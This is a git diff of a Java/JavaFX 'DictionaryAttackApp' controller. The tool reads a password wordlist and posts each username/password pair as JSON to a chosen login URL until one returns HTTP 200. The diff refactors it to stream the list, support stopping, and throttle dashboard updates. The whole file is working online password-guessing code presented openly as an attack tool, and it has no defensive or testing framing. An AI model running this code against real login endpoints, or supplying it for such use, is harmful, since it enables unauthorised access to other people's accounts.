@@ -1,19 +1,20 @@
 package controller;
-import java.io.File;
-import java.io.FileNotFoundException;
+import java.io.BufferedReader;
+import java.io.FileReader;
 import java.io.IOException;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
-import java.util.ArrayList;
-import java.util.Scanner;
 import javafx.application.Application;
 import javafx.concurrent.Task;
 import javafx.stage.Stage;
 import main.DictionaryAttackApp;
 
 public class AttackController extends Application{
+    private boolean passFound = false;
+    private long sec = 0;
+    private double obt = 1;
     @Override 
     public void start(Stage args0){
         DictionaryAttackApp dic = new DictionaryAttackApp();
@@ -21,12 +22,11 @@ public class AttackController extends Application{
     }
 
     //start the engine
-    public void start(String path, String username, String url, DictionaryAttackApp dic, long start){
-
+    public void start(String path, String username, String url, DictionaryAttackApp dic, long start, boolean term){
         Task<Void> attackTask = new Task<Void>() {
             @Override 
             protected Void call(){
-                runAttack(path, username, url, dic, start);
+                runAttack(path, username, url, dic, start, term);
                 return null;
             }
         };
@@ -34,38 +34,26 @@ public class AttackController extends Application{
         attackThread.setDaemon(true);
         attackThread.start();
     }
-    //Core logic/ Engine
-    private void runAttack(String path, String username, String url, DictionaryAttackApp dic, long start){
-        ArrayList<String> passwords = getPasswords(path);
-        double size = passwords.size();
+    //Core logic / Engine
+    private void runAttack(String path, String username, String url, DictionaryAttackApp dic, long start, boolean term){
+        int size = getPasswords(path);
 
+        try(BufferedReader reader = new BufferedReader(new FileReader(path))){
+            String pass = null;
         //Creating HTTP client
         HttpClient client = HttpClient.newHttpClient();
 
-        double obt = 1;
-        for(String pass : passwords){
-            String jsonPayload = String.format("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
-            dic.appendLogArea("PayLoad = "+ jsonPayload+"\n");
-            dic.setc1Val(""+(int)obt);
-            dic.setc4Val(""+(int)obt);
-            dic.setcandVal(pass);
+        while((pass = reader.readLine()) != null && !(term)){
+            term = dic.getTerm();
+            String jsonPayload = ("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
             //Visualizing elapsed time
             long end = System.currentTimeMillis();
             long elapsedTime = end - start;
-            long mins = elapsedTime / 6000;
-            long sec = (elapsedTime % 6000)/1000;
+            long mins = elapsedTime / 60000;
+            sec = (elapsedTime % 60000)/1000;
             long ms = elapsedTime % 1000;
-            dic.setc2Val(""+mins+":"+sec+":"+ms);
-            double attemptMS = obt / (double)ms;
-            attemptMS = Math.round(attemptMS * 1000.0) / 1000.0;
-            dic.setc3Val(""+attemptMS);
-            //showing percentage on the dashboard
             double percentage = Math.round(((obt/size)*100.0) * 100.0) / 100.0;
-            dic.setpctLbl(""+percentage);
-            //progressbasr setter 
-            dic.setprogressBar(percentage);
             obt++;
-            // System.out.println("Json Payload:"+jsonPayload);
             //building post request
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(url))
@@ -77,12 +65,9 @@ public class AttackController extends Application{
             int responseCode = 0;
             try{
                 HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
-                // System.out.println(response.statusCode());
                 responseCode = response.statusCode();
-                dic.appendLogArea("Status Code = "+ responseCode +"\n");
                 if (responseCode == 200) {
-                    dic.setpassField("Pass: "+pass);
-                    dic.appendLogArea("Password found = "+ pass +"\n");
+                    passFound = true;
                     break;
                 }
 
@@ -90,27 +75,53 @@ public class AttackController extends Application{
             catch(IOException | InterruptedException e){
                 System.out.println("Network Error");
             }
-            if(responseCode != 200){
-                dic.setpassField("Password not found!");
-                dic.appendLogArea("Password not found!\n");
+            if(obt % 50 == 0){
+                dic.appendLogArea("Status Code = "+ responseCode +"\nPayLoad = "+ jsonPayload+"\n");
+                double resultNumbers = obt;
+                String resultString = ""+obt;
+                if(resultNumbers >= 1000000.0){
+                    resultNumbers /= 1000000.0;
+                    resultNumbers = Math.round(resultNumbers * 10.0) / 10.0;
+                    resultString = resultNumbers + "M";
+                }else if(resultNumbers >= 1000.0){
+                    resultNumbers /= 1000.0;
+                    resultNumbers = Math.round(resultNumbers * 10.0) / 10.0;
+                    resultString = resultNumbers + "K";
+                }
+
+                dic.updateAttackUI(resultString, ""+mins+":"+sec+":"+ms, pass, percentage, resultString);
             }
+            if(obt % 1000 == 0){
+                dic.setLogArea("");
+            }
+        }
+        if(passFound){
+            dic.setpassField("Pass: "+pass);
+            dic.appendLogArea("\nPassword found = "+ pass +"\n");
+        }else{
+            dic.setpassField("Password not found!");
+            dic.appendLogArea("Password not found!\n");
         }
     }
-    //Storing passwords in an Arraylist
-    public ArrayList<String> getPasswords(String path){
-        ArrayList<String> passwords = new ArrayList<>();
-        try{
-            File txt = new File(path);
-            Scanner sc = new Scanner(txt);
-
-            while (sc.hasNextLine()) { 
-                passwords.add(sc.nextLine());
+    catch(Exception e){
+        System.out.println("File Error!");
+        e.printStackTrace();
+    }
+        double attemptMS = sec > 0 ? obt / sec : 0;
+        attemptMS = Math.round(attemptMS * 1000.0) / 1000.0;
+        dic.setc3Val(attemptMS+"");
+    }
+    // Counting passwords
+    public int getPasswords(String path){
+        int count = 0;
+        try(BufferedReader reader = new BufferedReader(new FileReader(path))){
+            while ((reader.readLine()) != null) { 
+                count++;
             }
-            sc.close();
         }
-        catch(FileNotFoundException e){
+        catch(Exception e){
             System.out.println("File not Found!");
         }
-        return passwords;
+        return count;
     }
 }
